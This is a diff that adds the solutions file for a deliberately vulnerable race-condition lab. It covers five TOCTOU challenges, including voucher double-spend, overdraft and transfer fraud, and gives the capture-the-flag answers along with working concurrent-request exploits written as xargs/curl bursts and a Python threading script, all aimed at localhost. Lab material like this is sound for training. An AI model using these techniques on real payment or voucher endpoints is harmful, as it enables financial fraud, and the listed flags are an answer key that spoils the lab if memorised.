@@ -1,0 +1,102 @@
+===============================================================================
+  NeonVault — Race Condition Lab Solutions (Port 5013)
+===============================================================================
+
+All challenges exploit TOCTOU (Time-of-Check to Time-of-Use) gaps.
+The server has a deliberate time.sleep(0.1) between CHECK and UPDATE.
+Send many concurrent requests to exploit the race window.
+
+POST /reset to restore initial state between challenges.
+
+CHALLENGE 1: Voucher Double-Spend
+Flag: FLAG{r4c3_d0ubl3_sp3nd}
+
+  The /redeem endpoint checks if voucher is unredeemed, sleeps, then
+  marks it as redeemed and adds credits. Send concurrent requests:
+
+  # Reset state first
+  curl -X POST http://localhost:5013/reset
+
+  # Send 20 concurrent redeem requests
+  seq 20 | xargs -P20 -I{} curl -sX POST http://localhost:5013/redeem \
+    -d "code=NEON-GIFT-2024"
+
+  # Check balance (started at 100, voucher worth 500, so >600 = double-spend)
+  curl http://localhost:5013/check-balance
+
+  With Python:
+    import threading, requests
+    def redeem():
+        requests.post('http://localhost:5013/redeem', data={'code':'NEON-GIFT-2024'})
+    threads = [threading.Thread(target=redeem) for _ in range(20)]
+    for t in threads: t.start()
+    for t in threads: t.join()
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Duplicate Registration
+Flag: FLAG{r4c3_p4r4ll3l_r3g}
+
+  The /register endpoint checks uniqueness, sleeps, then inserts.
+
+  curl -X POST http://localhost:5013/reset
+
+  seq 20 | xargs -P20 -I{} curl -sX POST http://localhost:5013/register \
+    -d "username=duplicateuser"
+
+  curl http://localhost:5013/check-dupes
+
+  Multiple rows with the same username will be created.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: Negative Balance (Overdraft)
+Flag: FLAG{r4c3_n3g4t1v3_bal}
+
+  The /withdraw endpoint checks balance >= amount, sleeps, then deducts.
+  Race two withdrawals that each pass the check but together exceed balance.
+
+  curl -X POST http://localhost:5013/reset
+
+  # Hacker has 100 credits. Withdraw 80 twenty times concurrently:
+  seq 20 | xargs -P20 -I{} curl -sX POST http://localhost:5013/withdraw \
+    -d "amount=80"
+
+  curl http://localhost:5013/check-negative
+
+  Balance goes deeply negative since each request saw balance >= 80.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: Bonus Double-Claim
+Flag: FLAG{r4c3_b0nus_cl41m}
+
+  The /claim-bonus endpoint checks claimed=0, sleeps, then sets claimed=1
+  and adds 300 credits. Race to claim multiple times.
+
+  curl -X POST http://localhost:5013/reset
+
+  seq 20 | xargs -P20 -I{} curl -sX POST http://localhost:5013/claim-bonus
+
+  curl http://localhost:5013/check-bonus
+
+  Flag appears when total bonus exceeds one claim (balance > 400).
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Transfer Fraud
+Flag: FLAG{r4c3_tr4nsf3r_fr4ud}
+
+  The /transfer endpoint checks balance >= amount, sleeps, then deducts.
+  Race concurrent transfers to send more than the available balance.
+
+  curl -X POST http://localhost:5013/reset
+
+  seq 20 | xargs -P20 -I{} curl -sX POST http://localhost:5013/transfer \
+    -d "to=guest&amount=80"
+
+  curl http://localhost:5013/check-fraud
+
+  Hacker's balance goes negative since all transfers passed the check.
+
+===============================================================================
